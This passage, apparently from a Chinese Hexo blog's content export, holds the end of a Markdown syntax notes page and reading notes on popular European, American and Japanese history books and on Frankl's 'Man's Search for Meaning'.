class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><p>这是文字……</p><ul><li>[x] 选项一</li><li>[ ] 选项二  </li><li>[ ] 选项三   </li></ul><p>22.锚点<br>代码<br>注：只有标题支持锚点， 跳转目录方括号后 保持空格</p><p><a href="#1">公式标题锚点</a></p><h1 id="需要跳转的目录-123-1-125"><a href="#需要跳转的目录-123-1-125" class="headerlink" title="[需要跳转的目录]&#123;#1&#125;"></a>[需要跳转的目录]&#123;#1&#125;</h1><p>$\operatorname*{Res}_{z=1}$</p><p>$\sum \limits_{x \to 1}$</p><p>tag=&gt;type: content:&gt;url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">st=&gt;start: Start</span><br><span class="line">op=&gt;operation: Your Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: Start|past:&gt;http://www.google.com[blank]</span><br><span class="line">e=&gt;end: End:&gt;http://www.google.com</span><br><span class="line">op1=&gt;operation: get_hotel_ids|past</span><br><span class="line">op2=&gt;operation: get_proxy|current</span><br><span class="line">sub1=&gt;subroutine: get_proxy|current</span><br><span class="line">op3=&gt;operation: save_comment|current</span><br><span class="line">op4=&gt;operation: set_sentiment|current</span><br><span class="line">op5=&gt;operation: set_record|current</span><br><span class="line"></span><br><span class="line">cond1=&gt;condition: ids_remain空?</span><br><span class="line">cond2=&gt;condition: proxy_list空?</span><br><span class="line">cond3=&gt;condition: ids_got空?</span><br><span class="line">cond4=&gt;condition: 爬取成功??</span><br><span class="line">cond5=&gt;condition: ids_remain空?</span><br><span class="line"></span><br><span class="line">io1=&gt;inputoutput: ids-remain</span><br><span class="line">io2=&gt;inputoutput: proxy_list</span><br><span class="line">io3=&gt;inputoutput: ids-got</span><br><span class="line"></span><br><span class="line">st-&gt;op1(right)-&gt;io1-&gt;cond1</span><br><span class="line">cond1(yes)-&gt;sub1-&gt;io2-&gt;cond2</span><br><span class="line">cond2(no)-&gt;op3</span><br><span class="line">cond2(yes)-&gt;sub1</span><br><span class="line">cond1(no)-&gt;op3-&gt;cond4</span><br><span class="line">cond4(yes)-&gt;io3-&gt;cond3</span><br><span class="line">cond4(no)-&gt;io1</span><br><span class="line">cond3(no)-&gt;op4</span><br><span class="line">cond3(yes, right)-&gt;cond5</span><br><span class="line">cond5(yes)-&gt;op5</span><br><span class="line">cond5(no)-&gt;cond3</span><br><span class="line">op5-&gt;e</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: 时序图例子</span><br><span class="line">A-&gt;B: 实线实箭头</span><br><span class="line">B--&gt;C: 虚线实箭头</span><br><span class="line">C-&gt;&gt;C: 实线虚箭头</span><br><span class="line">note right of C: 自通知</span><br><span class="line">note over B,C:横跨通知</span><br><span class="line">C-&gt;A:长通知</span><br><span class="line">note left of A:左通知</span><br></pre></td></tr></table></figure><p>在jupyter中设置link，需要设置两部分：<br>要跳到的位置(the destination)<br>需要在要跳转到的位置添加下面语句:</p><p><a id="the_destination"></a><br>这里的id取值任意赋值，下面在添加链接时要用</p><p>需要添加链接的文字（an internal hyperlink to the destination），即点击该处可以跳转到the destination，在需要添加链接的文字后面加入：</p><p><a href="#the_destination">需要添加连接的文字</a></p>]]></content>
      
      <categories>
          
          <category> Tooldocument </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>极简欧洲史</title>
      <link href="/2018/10/04/%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2/"/>
      <url>/2018/10/04/%E6%9E%81%E7%AE%80%E6%AC%A7%E6%B4%B2%E5%8F%B2/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《极简欧洲史》《半小时漫画欧洲史》</p><p>“欧洲，为什么老是抢第一？”澳大利亚知名历史学家约翰•赫斯特在本书中的一场引人入胜的探索，为我们梳理出欧洲文明所以能改变全世界的各种特质。</p><p>作者从三大元素：古希腊罗马文化、基督教教义以及日耳曼战士文化开篇，描述了这三大元素如何彼此强化，又相互对立，最终形塑为欧洲文明的内 核；继而在诸多世纪以来催生帝国与城邦，激发征服与十字军东侵，造就出许多性格截然分明的人物──如仁慈的皇帝、好斗的教皇、侠义的骑士，乃至世上第一批享受繁荣和启蒙果实的公民。哲学思维、民主制度的渊源、政治权力的传递、甚至是医学、生物学使用拉丁文的源始，这种种欧洲因素不断形塑了现代文明的各种特质，使欧洲遥遥走在现代世界的前列。</p><p>本书以清晰、幽默、发人深省的笔调，杂以活泼的插图，叙述了一个不同凡响的文明，及其对人类社会的巨大冲击与巨大贡献。<br><a id="more"></a></p><p>《半小时漫画欧洲史》</p><p>希腊时代：当年欧洲大多数没什么文化，而希腊是最文明的地方。<br>当年希腊不是一个国家，而是一个地区，<br>有个国家叫<strong>米诺斯</strong>，在克里特岛上——希腊文明1.0：<strong>克里特文明</strong><br>米诺斯势弱，希腊本土崛起——希腊文明2.0：<strong>迈锡尼文明</strong><br>其中，发生<strong>特洛伊战争</strong><br>再后来——希腊文明3.0：<strong>古风时代</strong><br>仍然是城邦国家，但是有两个：<strong>雅典</strong>和<strong>斯巴达</strong><br>此时，亚洲冒出<strong>波斯</strong><br>大敌当前，两个城邦连手，希腊一堆小国家，在两个大哥带领下，把波斯赶走——<strong>希波战争</strong><br>再发生希腊内战<strong>伯罗奔尼撒战争</strong>，两败俱伤。<br>此时，位于希腊的北边偏远的<strong>马其顿</strong>崛起，将希腊统一，<strong>亚历山大</strong>：一路向东征服埃及、波斯、西亚和印度，建立地跨欧亚非三大洲的超级帝国。<br>希腊辉煌随着亚历山大去世基本尾声。<br><strong>罗马</strong>：亚历山大向东征战，西边罗马人在意大利四面扩展，希腊没落欧洲重心转向罗马，直到希腊也被征服，欧洲进入罗马时代。<br>罗马：<strong>罗马王政</strong>、<strong>罗马共和国</strong>和<strong>罗马帝国</strong><br>最初，罗马在意大利半岛一个小土坡上，整个国家由君主说了算，——<strong>罗马王政</strong><br>后来，改成由”<strong>执政官+元老院</strong>“——<strong>罗马共和国</strong><br>紧接着罗马扩展到欧非亚三大洲，就有执政官变成<strong>终身独裁官</strong><br>最著名的就是<strong>凯撒</strong>，后来惹怒元老院，被一人一刀活活捅死<br>凯撒的外甥女的儿子<strong>屋大维</strong>，把元老院干掉一半，继续独裁，开国皇帝——<strong>罗马帝国</strong><br>此时罗马帝国越来越大，从西班牙到土耳其<br>皇帝<strong>戴克里先</strong>把帝国分成东西，分别由大小皇帝管，后又闹掰，被一个人收拾完，<strong>君士坦丁大帝</strong>，但最终还是分裂，东西罗马，东罗马以土耳其为主，<strong>拜占庭</strong>，西罗马以意大利为主，<strong>败干净</strong><br>东罗马一千年，西罗马一百年就被外邦人灭了。</p><p>东罗马一直到文艺复兴<br>西罗马到文艺复兴时期经历中世纪<br>罗马帝国虽然占领大半个欧洲但是外围仍有些地方是日耳曼人的。<br>（日耳曼是个大民族，有很多分支：哥特人、法兰克人、汪达尔人、盎格鲁人、萨克逊人等）<br>罗马分裂后，东罗马一直独善其身，日耳曼人挑西罗马下手，从此西罗马灭亡，取代他的是无数个日耳曼民族建立的无数小国家。<br>这些被罗马人称为蛮族的日耳曼人成为了大部分欧洲人的祖先。<br>在中世纪这部分，在西罗马的故土上（西欧）<br>有一支<strong>法兰克人</strong>，建立了<strong>法兰克王国</strong>，本是一堆日耳曼国家中的一个，直到出现一个大佬<strong>查理曼大帝</strong>，将几乎所有全部日耳曼国家揽在一起，又将西欧统一起来（扑克牌中的<strong>红桃K</strong>）就是查理曼大帝。<br>他死后（按照日耳曼习俗：将遗产平均分给儿子们）将法兰克王国分成三块，从西到东，后来变成法国、意大利、德国。<br><strong>一、神圣罗马帝国</strong>东法兰克慢慢变成德国雏形：<strong>德意志</strong>。它跟别的国家不一般更像春秋战国各自为政。其中一个诸侯不但在德意志称霸而且还侵占意大利，<strong>奥托大帝</strong>，将德意志改为叫<strong>罗马帝国</strong>。他的继任者又加上“<strong>神圣</strong>”二字。这是德意志民族在历史上第一次人生巅峰，所以又叫<strong>第一帝国</strong>。<br>一千年后的希特勒狂喊的“第三帝国”就是从此开始的。<br>“第二帝国”是普鲁士时代，《最后一课》讲的就是法国被普鲁士占领的情形。<br><strong>二、英法战争</strong>：<br>欧洲西北角有个岛更法国隔热一条海，岛上有个国家叫<strong>英格兰</strong>，跟<strong>法国</strong>是宿敌，起源是英格兰的国王在法国也有地盘，比如<strong>诺曼底</strong>，即使血缘关系也没有解决地盘纷争，于是开始百年战争。<br>中世纪的欧洲不仅要窝里斗，而且要面对共同的敌人<strong>中东</strong><br><strong>三、十字军东征</strong>：早在查理曼他爷爷时候，中东就有一群人跟欧洲信仰不同，闹了矛盾，后来还抢了重要地盘<strong>耶路撒冷</strong>，于是西欧开始跟中东拼命，这就是十字军东征，两百年也没收成，最后全部赶回欧洲。<br><strong>四、文艺复兴</strong>：<br>罗马时期全民信教，通关所有事务，专门给人做思想工作，<strong>教皇</strong><br>西罗马灭亡后，<br>查理曼大帝他爹丕平在意大利分地给教皇，后来变成<strong>教皇国</strong>，不过现在只剩梵蒂冈一小部分了，<strong>丕平献土</strong><br>从此皇帝和教皇，号称欧洲的“二统”，一个统治世俗，一个通知精神，相互依赖，<strong>教皇给皇帝加冕，皇帝给教皇加餐。</strong>在以后的更多时间里，双方经常为了权利而明争暗斗。<br>中世纪景象四件套：文化全靠背经，艺术只画上帝一家亲，科技全赖村头铁匠铺，外交就是不断打中东。称为<strong>黑暗中世纪</strong><br>过了一千年，终于有人觉得不对劲，明白了：只有人才能救自己。<br>欧洲开始吧对上帝的关注转移到自己身上，提出要像希腊罗马时代一样恢复社会生机。这就是欧洲伟大的“<strong>文艺复兴</strong>”。从此欧洲告别蒙昧时代，爆发巨大创造力，变成世界领跑者。</p><p>公元1500年，欧洲人一不小心，打通世界任督二脉，全世界命运从此纠缠不清，世界历史忽然切换到一种很亲切的模式叫做<strong>大乱炖模式</strong>。<br>文艺复兴&amp;东罗马灭亡<br>中世纪末期，一场黑死病，直接卷走欧洲三分之一的生命。<br>（在<strong>马克·波罗</strong>亚洲遍地黄金的号召下）<br>欧洲人做梦都想到亚洲，往都走来到东罗马发现西欧的老朋友——千年帝国东罗马，被土耳其人国家灭了，这就是<strong>奥斯曼帝国</strong>，于是开始走水路。<br><strong>一、大航海时代开始</strong>：首先出门的<strong>葡萄牙人</strong>绕过非洲最南端来到亚洲，靠的是非凡的勇气。<br>随后出门的<strong>西班牙</strong>，选择走后门绕一圈找到美洲，靠的是非同一般的大脑。西班牙-哥伦布：找到美洲完全是因为计算失误，算错地球周长，以为很快就能到亚洲，结果误打误撞发现美洲。不过他至死认定自己到的是印度或者日本。<br>亚洲有香料，美洲有黄金，葡萄牙和西班牙变成了欧洲最先富起来的。<br>本来穷，突然富，天天出门掐架炫富。史上著名的西班牙无敌舰队就是在有钱后建的。<br>整个欧洲嫉妒的发狂，尤其英国人，英国女王伊丽莎白曾经默许自家海盗流氓去抢西班牙的船。<br>结果西班牙、葡萄牙双双衰落，英国称为最后欧洲一霸，抢到几乎所有亚洲和北美的殖民地。<br>地盘遍布全世界，号称<strong>日不落帝国</strong><br>大航海最重要的意义：<strong>大开眼界</strong><br>开始研究天文地理物理化学，科学技术发展的同时，<strong>国家也需要革命</strong><br><strong>二、同去革命不？同去同去</strong>：<br><strong>英国革命</strong>：资产阶级开始革命，<strong>议会</strong>登上舞台。<strong>君主立宪制</strong><br><strong>美国革命</strong>：英国殖民地受到待遇更本土不一样，税没少交，却没权利，建立<strong>美国</strong>。<br><strong>法国大革命</strong>：法国是当时欧洲本土最强大的国家，比如<strong>路易十四</strong>，喜欢在舞台上扮演太阳神，所以有人称他为太阳王。<strong>路易十六</strong>：税收政策至少说明两点：一、法国社会特别不平等，越穷越交税；二、女人不败，男人不爱。国王犯了众怒，被送上断头台。——<strong>法国大革命</strong><br><strong>三、拿破仑时代</strong><br>拿破仑本来是临时政府的一个炮兵少校，平步青云，瞅准机会一直坐到法国皇帝。他是个有巨大野心的军事天才。刚当上皇帝就四处开炮，几乎整个欧洲都变成他家的。他只在一个地方吃亏：<strong>俄国</strong>。<br>拿破仑的下坡路从此开始，没过几年，全欧洲组成男子天团<strong>反法同盟</strong>，终于在比利时<strong>滑铁卢</strong>，把拿破仑打趴下。<br>想要打败拿破仑这种天才，靠的不是战术战略政治外交，而是一种“梦想总要有的，万一实现了呢”的勤奋。反法同盟不到二十年就搞了七次，五次针对拿破仑。<br>第七次终于把拿破仑彻底打败，大家把他流放到一个小岛上与世隔绝，最终死在这个岛上。<br>所以打败拿破仑概率极低，成功就是撞大运。<br><strong>四、德意志逆袭啦</strong><br>德意志以前在欧洲表现一般，别的国家都是铁板一块，德意志内部很不团结，直到出现一个<strong>俾斯麦</strong><br>德意志有两大诸侯：普鲁士&amp;奥地利，天天掐架争老大。<br>最后普鲁士憋个大招：铁血宰相俾斯麦。打败奥地利，法国，统一德国，变成欧洲第一强国，号称第二帝国。</p><p>后来<strong>德国&amp;奥匈帝国&amp;意大利</strong>组成“同盟国”<br><strong>英国&amp;法国&amp;俄国</strong>组成“协约国”</p><p>希波战争</p><p>公元前490年——公元450年<br>事件：希波——希腊和波斯，大波斯帝国三次入侵小希腊，最终被打回老家。</p><p>时间：<br>希腊：欧洲文明发源地<br>罗马：现在还在蓄力，再过一段时间就要发大招。<br>埃及：已经有三千多年历史，正在被波斯蹂躏。<br>波斯：地跨欧亚非，十分霸气<br>印度：被波斯咬去一大块，乱成一团，孔雀王朝还没出现，佛教刚刚诞生。<br>中国：东周列国，正厮杀一片。</p><p>当时希腊：文明圣地，（是个地名，这个地方有无数个小国家：雅典、柯林斯、斯巴达、爱欧尼亚和迈锡尼等，当时都是一个个城市，当年都是一个个国家）<br>因为这些国家有着相同的希腊风格，所以我们管它们叫希腊世界。<br>这些国家中，其他都是配角，我们主要了解两个世界：</p><div class="table-container"><table><thead><tr><th></th><th>雅典</th><th>斯巴达</th></tr></thead><tbody><tr><td>实力</td><td>绝对土豪</td><td>武力小霸王</td></tr><tr><td>个性</td><td>民主先锋</td><td>独裁典范</td></tr><tr><td>共同点</td><td>都认为对方是蠢货</td><td>都认为对方是蠢货</td></tr></tbody></table></div><p>波斯：从小部落开始，过了几十年，变成世界上第一个地跨亚欧非三大洲的帝国，往东到印度，往西：巴比伦、叙利亚、埃及、小亚细亚一直到地中海，</p><p><strong>第一次希波战争</strong><br>波斯帝国是大流士，于公元前492年，冲出亚洲走向世界，直奔欧洲本土的希腊世界。<br><strong>海陆并进，立体作战</strong><br>陆军刚跨过海峡打趴，海军喂鱼</p><p><strong>第二次希波战争</strong><br>公元前490年，大流士领十万人在雅典附近一平原登陆<strong>马拉松平原**</strong>马拉松战役**</p><p><em>雅典以一万人生生打败波斯十万人大军后，一个叫斐里皮德斯的士兵奔回雅典城报捷，紧接着“啪”一声扑街了。</em></p><p>所以第二次希波战争又在大流士失败中结束了。</p><p><strong>第三次希波战争</strong></p><p>两次入侵希腊失败，大流士抑郁而终。<br>他儿子<strong>薛西斯</strong>最高最帅的儿子。</p><p>带领三十万小弟上千艘战舰御驾亲征。</p><p>雅典准备海军，斯巴达国王<strong>列奥尼达</strong>带领几千希腊联军赶往温泉关阻击波斯大军。</p><p>温泉关是北方南下希腊大本营的必经之地，一边海边悬崖，一边是陡峭的高山，中间只有非常狭窄的过道，真正“一夫当关万夫莫开”两天毫无进展，第三天希腊出个叛徒，被包围，列奥尼达让几千希腊联军撤退，自己带领三百位亲卫军死磕温泉关。直到战斗到最后一人。<br>薛西斯继续南下逼近雅典，火烧空城，<br>雅典指挥官——特米斯托克利，将波斯巨舰诱惑进来，全歼<br>希波战争三场主要战役全部打完。<br><strong>尾声</strong><br>公元前449年，签订和平条约，打了<strong>四十年</strong>的希波战争宣告结束。强大的波斯帝国也由盛转衰。<br><strong>后事</strong><br>希腊内讧，薛西斯被宰相谋杀</p><p>直到一个希腊人登上波斯土地，亲手终结波斯帝国——<strong>亚历山大</strong></p><p><strong>十字军东征之三大骑士团</strong><br><strong>骑士团</strong><br>十字军东征主要业务就是跑到中东抢地盘<br>西欧距离中东距离遥远，于是在中东的骑士自己组团，直接向教皇报告<strong>骑士团</strong><br><strong>三大骑士团</strong></p><p><strong>医院骑士团、圣殿骑士团、条顿骑士团</strong></p><p><strong>医院骑士团</strong><br>关键词：医院、马其他<br>在耶路撒冷附近的一个医院专门治病救人<br>后来到<strong>罗德岛</strong>——<strong>马耳他岛</strong><br>最后被<strong>拿破仑</strong>打败<br>如今在罗马只管治病救人搞慈善，即<strong>马耳他骑士团**</strong>马耳他十字**</p><p><strong>圣殿骑士团</strong><br>关键词：财富  死得惨<br>在耶路撒冷的<strong>所罗门圣殿</strong>基本上是法国同乡会</p><p>圣殿骑士后来被中东人打败，回到法国，但后来遇到不靠谱的法国国王<br>非常歹毒的编造了许多罪名。<br>全部处死，那天是10月13日，也变成“黑色星期五”的说法之一。<br>但巨额财富从未找到。变成许多小说的财富比如《达·芬奇密码》<br>白底红十字就是圣殿骑士团的标志。</p><p><strong>条顿骑士团</strong><br>关键词：铁血 骑士团国<br><strong>条顿</strong>不是顿顿吃面条，而是欧洲的一个国家，生活在现在德国。在中东没找到人生目标，在欧洲却找到人生目标了。<br>波兰跟普鲁士大战，波兰被胖揍，找到条顿骑士团，把普鲁士揍了一顿，赖着不走建立<strong>骑士团国</strong>此时的普鲁士<strong>铁血style</strong>注入条顿基因。</p><p>后来遇上马丁·路德的宗教改革，又被拿破仑骑士团收割，直接解散了。<br>准确说是拿破仑不让骑士团打了，只能做点生意搞搞慈善。<br>最后在奥地利设个总部，出没于欧洲各地，白底黑十字是条顿骑士团。</p><p><strong>真正的加勒比海盗</strong><br>历史上真正的加勒比海盗，<br>加勒比海夹在南北美洲之间，是大西洋西部的一片海域，与各个国家亲密接触，比如委内瑞拉、哥伦比亚、哥斯达黎加、洪都拉斯等等</p><p><strong>西班牙</strong>本是欧洲最南边的一个小国，特别落后，特别穷。不过西班牙运气挺好，投资一个哥伦布环球穷游计划，一不留神发现欧洲提款机：<strong>美洲</strong>。一夜暴富可劲花钱，发了横财，不花在发家致富，而是花在最没用的地方<strong>打仗</strong><br>16世纪是西班牙的巅峰期，能和奥斯曼帝国抗衡，没事抓着教皇打，欧洲没一个镇得住它，它还给自己按个头衔<strong>日不落帝国</strong>后来的英国的<strong>日不落帝国</strong>就是仿照西班牙的。<br>这是英法荷请来强力外援<strong>海盗</strong><br>他们在西班牙货船必经之地：<strong>加勒比海</strong>蹲点打劫<br>海盗之所以盯着西班牙：因为当时西班牙规定，不是西班牙的船，不能在美洲做生意。</p><p>英国女王<strong>伊丽莎白</strong>给抢劫西班牙货船的人发<strong>私掠许可证</strong>，只要按照上面规定，就不算抢劫。<br>最早由执照的，最著名的是英国海盗德雷克。</p><ol><li>抢了最难抢的：西班牙珍宝舰队</li><li>打了最难打的：西班牙无敌舰队</li></ol><p>后面出名的：黑白通吃的：亨利·摩根、基德船长：威廉·基德、海盗界的传奇：爱德华·蒂奇</p><p>加勒比海盗之所以有名是因为 戒律&amp;据点</p><p>海盗从业准则：<br>遇事需集体举手表决<br>不准在船上赌博<br>不准带女人上船<br>晚上8点准时熄灯<br>海盗几个根据地：<strong>龟岛、皇家港、拿骚</strong></p><p><strong>没落</strong><br>西班牙很快败光家产，欧洲其他国家，尤其英国的实力大涨，海盗已经没有利用价值，于是也被抛弃了。<br>没有人雇佣，也没有利益驱动，加勒比海盗就这样渐渐没落了。</p><p><strong>美国往事（一）：独立战争</strong><br>15世纪（约中国明朝的时候）有个叫<strong>哥伦布</strong>的欧洲人发现，一直以为是亚洲的日本。<br>直到一个意大利人用自己的名字命名，这个人叫<strong>阿美利哥</strong>，这个地方叫<strong>美洲</strong></p><p>整个欧洲都来占坑，占坑最多的是<strong>英国</strong>和<strong>法国</strong>。最后英国战胜法国，占领大部分地方。</p><p>英国来美洲最著名的一艘船是“五月花”号，一船都是在国内的弱势群体，除此之外，还有农民、草根，甚至劳改犯等等。</p><p>当然也有一些人生赢家，高富帅军官<strong>华盛顿</strong>早就跟地主爸爸在美洲生活了。</p><p>英国本土对美洲这边各种压榨，还不给权利。</p><p>（比如英国本土卖不掉的茶叶，就白菜价卖到美洲去，搞的美洲茶叶卖不掉，把当地做生意的惹毛了，他们装扮成印第安人，跑到波士顿港口，把英国船上的茶叶全部倒海里了，这就是著名的波士顿倾茶事件，美英矛盾爆发的导火索之一。）<br>这就是美国<strong>独立战争</strong></p><p>十三个英国殖民地，被华盛顿带领的一起造反，<strong>《独立宣言》</strong></p><p>（《独立宣言》，独立战争期间由<strong>杰斐逊</strong>起草，1776年7月4日通过，所以定位美国国庆节——<strong>独立日</strong>）</p><p>（纽约的自由女神像，就是法国人在美国独立100周年的时候送的，象征自由和反抗暴政）</p><p>（每个民族的崛起都满手血腥，美国的诞生过程也是一部原住民印第安人的血泪史。）</p><p><strong>美国往事（二）：南北战争</strong><br>最早的美国只有十三个州。<br>美国的江山都是<strong>买二手的</strong> <strong>不见兔子不撒狗，不到换季不出手</strong> <strong>路易斯安那</strong> <strong>佛罗里达</strong> <strong>阿拉斯加</strong>  <strong>夏威夷</strong>  <strong>德克萨斯</strong></p><p><strong>南北战争</strong></p><p>美国历史上唯一一次内讧，就是南北战争，原因<strong>为了爱和正义，解放黑奴</strong></p><p><strong>所有的流血都是因为钱</strong></p><div class="table-container"><table><thead><tr><th>北方</th><th>南方</th></tr></thead><tbody><tr><td>喜欢开工厂，工业化路线</td><td>种植园经济</td></tr><tr><td>老板和员工</td><td>奴隶主和黑奴</td></tr></tbody></table></div><p>一旦把生意做到国外，出现问题，南方人要求关税降低<br>北方人要求抬高关税<br>一言不合就刚上，<br>直到有一天支持北方的<strong>林肯</strong>当上美国总统</p><p>南方联合起来<strong>美利坚联盟国</strong><br>北方联合起来<strong>美利坚合众国</strong><br>打了起来，这就是<strong>南北战争</strong></p><p>战争打了起来，南方打仗很猛，打得北方差点连亲妈都不认识，林肯急了眼，这才被逼无奈使出大招：<strong>解放黑奴，还给土地</strong>。听到这个消息，无数黑奴立刻逃到北方来参军，南方整个被掏空，最后北方打败南方，美国最终避免分裂，奴隶制度也随之终结，（林肯最终结局，在战争后跑去剧院看戏，结果被拥护奴隶制度的仇家枪杀了）</p><p>（理解世界的过程中，要正确认识人性的作用，不要贬低也不要拔高。即便你意思每场战争的重大影响因素，人性的真善美，总能在大方向上掌控全局）</p><p><strong>美国往事（三）：上帝保佑美国</strong></p><p>（著名3K党，就是赤裸裸的种族歧视者）</p><p>God Bless America!<br>这句话不是祈祷，而是<strong>我爸可疼我了</strong></p><p><strong>一口气读完日本史</strong></p><p>第一个阶段：￥%……&amp;#%*&amp;<br>全部是小部落，无国家。<br>的二个阶段：天皇很厉害<br>飞鸟时代、奈良时代、平安时代<br>一个部落发达了，位置在京都、大阪和奈良之间叫<strong>大和平原</strong><br>这个部落越来越大最后变成一个国家，它就是今天日本的雏形也就是<strong>大和民族</strong><br>慢慢扩大到今天的<strong>大和民族</strong></p><p>找来许多专业打手，就是武士，有两个团队最厉害，一支姓平，一支姓源，两家对干<strong>源平之争</strong></p><p>最后源氏胜出，成为天皇手下首席武士，天皇封源氏为<strong>征夷大将军</strong>，天皇很快被这个将军架空</p><p><strong>第三个阶段：天皇打酱油——幕府时代</strong><br>镰仓幕府、室町幕府、德川幕府<br>大将军把天皇放到一边，自己另外建个办公楼做将军府又叫<strong>幕府</strong><br>源氏将自己的幕府建在东京旁边的镰仓，<strong>镰仓幕府</strong><br>镰仓幕府期间最著名事件，应该是元朝大军征服欧亚大陆之后，元朝人正要渡海来日本，结果人品不济，两次刮风翻了船，日本就这样幸免了。</p><p>（这两次“神风”就是二战时期日本敢死队“神风特攻队”的由来）</p><p>后来<strong>室町幕府</strong></p><p>后来，日本<strong>战国时代</strong>出现著名三连发<strong>织田信长、丰臣秀吉、德川家康</strong></p><p><strong>德川幕府</strong></p><p><strong>天皇满血复活——明治维新</strong></p><p>明治时代：<strong>明治维新</strong>学习西方，洋为日用</p>]]></content>
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>活出生命的意义</title>
      <link href="/2018/08/25/%E6%B4%BB%E5%87%BA%E7%94%9F%E5%91%BD%E7%9A%84%E6%84%8F%E4%B9%89/"/>
      <url>/2018/08/25/%E6%B4%BB%E5%87%BA%E7%94%9F%E5%91%BD%E7%9A%84%E6%84%8F%E4%B9%89/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Man’s Search for Meaning</p><a id="more"></a><p>作者——维克多·弗兰克尔医师，1905年出生于维也纳，与弗洛伊德的家只有一街之遥。在学术上是“精神分析第三位维也纳学派”的创始人。他以“意义疗法”为核心，而起分析方法则被称为“存在分析法”（Existential Analysis）.</p><p>人们面对伤害、苦难与失去，第一阶段必然是震惊、失望，而接着会自己营造出一个冷漠的保护壳，用来抵抗世界和自己。只有到了第三阶段的超越：小我消失、感性升华，始能重新爱人与爱这个世界。</p><p>“知道为什么而活的人，便能生存。”——尼采</p><p>作者对那些因放弃对未来渴望而放弃生命的狱友嗤之以鼻，因为这些人的死亡的原因不是因为食物或药品的匮乏，而是因为缺失对未来的渴望和不知道自己为什么而活。</p><p>奥斯维辛的经历不啻于一场噩梦，但这段不堪回首的往事反而强化了弗兰克尔的核心理念：生活并非腐肉亦的所宣扬的那样，只是简单地祈求快乐，也并非阿德勒所教导的那样，只是为了争权夺利。人们或者是为了寻找生命的意义，这也就是人们一生中被赋予的最艰巨的使命。弗兰克尔发现可能找寻生命意义的三个途径：工作（做有意义的事）、爱（关爱他人）以及拥有克服困难的勇气。</p><p>弗兰克尔最具持久力的观点：一些不可控的理念可能会拿走=你很多东西，但它唯一无法剥夺的是你自主选择如何应对不同处境的自由。你无法控制生命中会发生什么，但你可以控制面对这些事情时自己的情绪与行动。</p><blockquote><p>与心理分析相比，意义疗法并不那么内省和溯旧。相反，意义疗法着眼于未来！着眼于患者将在未来应当完成的意义（相当于着眼于意义的心里疗法）。同时意义疗法对于所有恶性循环群系和反馈机制进行散焦，因为它们在神经官能症地发展过程中起着极其重要的作用。这样做就能破解了而不是持续地促进和强化神经官能症患者的自我中心症结。</p></blockquote><p>意义疗法或者某些叫“心理疗法的第三个维也纳学派”，着眼于人类存在的意义以及对于这种意义的追求。根据意义疗法，努力发现生命的意义正是人最主要的动力。</p><p>对比于弗洛伊德的心理分析学说的强调的快乐学说和阿德勒学派的“追求权利”或者“追求优越”之说。</p><p><strong>追求意义</strong><br>人类对生命意义的追求是其主要动机，而不是什么本能驱动的“次级合理化”，这种生命的意义是独特的，因为只是并且只能是由特定的某个人来完成。也只有这样他才满足自己追求意义的独特愿望。一些学者认为，意义和价值“不过是心理防御机制的反向形成和升华法而已”。作者diss这种观点。</p><p>解释：无意识的冲动在意识层面上向相反方向发展，人的外表行为或情感表现与其内心的动机欲望完全相反！这在心理学上称为“反向形成”。</p><p>我们应当停止剥离伪装的过程。要是发现被访者的回答是真实的。因为如果不停止，那么“剥离伪装的心理学家”所剥去的就是他自己的“隐蔽动机”——即潜意识里贬低人们真正需要的需要。</p><p><strong>存在之挫折</strong></p><p>人对意义的追求也会遇到挫折，这就是意义疗法所谓的“存在之挫折”。</p><p>存在一词有三种含义，存在的本身，存在的意义，对个体追求存在之意义的追求即对意义的追求。</p><p>存在之挫折也会导致神经官能症。这类病症在意义疗法中被称为“意源性神经官能症”</p><p><strong>意源性神经官能症</strong></p><p>意源性神经官能症的发生不是由于欲望与本能的冲突，而是由于存在本身出现了问题，而是由于存在本身出现了问题。其中追求意义的过程中遇到挫折是一个很重要的原因。最有效的办法是意义疗法。</p><p>并非所有的冲突都是神经官能症性质的，一定程度地冲突是正常的。</p><p>人对于生命价值的担心乃至绝望是一种存在之焦虑，而非绝心理疾病。</p><p>医生很可能是用后者去解释前者，导致他看不到患者对存在之前绝望。而医生的任务本该引导患者度过其成长和